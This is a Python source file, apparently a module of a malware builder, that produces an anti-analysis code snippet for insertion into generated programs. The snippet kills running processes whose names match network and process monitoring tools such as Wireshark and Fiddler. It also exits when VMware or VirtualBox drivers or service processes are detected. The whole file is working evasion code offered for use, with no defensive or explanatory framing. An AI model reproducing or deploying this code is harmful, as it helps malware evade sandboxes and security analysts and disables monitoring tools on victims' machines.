import random, string
class ANTI_DEBUG:
    def __init__(self,anti_debug=False):
        self.anti_debug = anti_debug
    def get_antidebug(self):
        code = """anti_debug = 'xd'
if anti_debug:
    try:
        from psutil import process_iter, NoSuchProcess, AccessDenied, ZombieProcess
        def MONKEND(MONKEYNAMEZ):
            for MONKEYPROC in process_iter():
                try:
                    for MONKK in MONKEYNAMEZ: 
                        if MONKK.lower() in MONKEYPROC.name().lower():MONKEYPROC.kill()
                except (NoSuchProcess, AccessDenied, ZombieProcess):pass
        def MONKSTART():
            MONKEYNAMES = ['http', 'traffic', 'wireshark', 'fiddler', 'packet', 'process']
            return MONKEND(MONKEYNAMEZ=MONKEYNAMES)  
        MONKSTART()
    except:
        pass
    try:
        import os
        import sys
        from psutil import process_iter
        if os.path.exists("C:\\WINDOWS\\system32\\drivers\\vmci.sys"):sys.exit()
        if os.path.exists("C:\\WINDOWS\\system32\\drivers\\vmhgfs.sys"):sys.exit()
        if os.path.exists("C:\\WINDOWS\\system32\\drivers\\vmmouse.sys"):sys.exit()
        if os.path.exists("C:\\WINDOWS\\system32\\drivers\\vmusbmouse.sys"):sys.exit()
        if os.path.exists("C:\\WINDOWS\\system32\\drivers\\vmx_svga.sys"):sys.exit()
        if os.path.exists("C:\WINDOWS\system32\drivers\VBoxMouse.sys"):sys.exit()
        if os.path.exists("C:\\WINDOWS\\system32\\drivers\\VBoxMouse.sys"):sys.exit()
        for MONKKK in process_iter():
            if MONKKK.name().lower() == "vmsrvc.exe".lower() or MONKKK.name().lower() == "vmusrvc.exe".lower() or MONKKK.name().lower() == "vboxtray.exe".lower() or MONKKK.name().lower() == "vmtoolsd.exe".lower() or MONKKK.name().lower() == "vboxservice.exe".lower():
                sys.exit()
    except:
        pass\n\n"""
        if self.anti_debug:
            code = code.replace("'xd'",'True')
        return code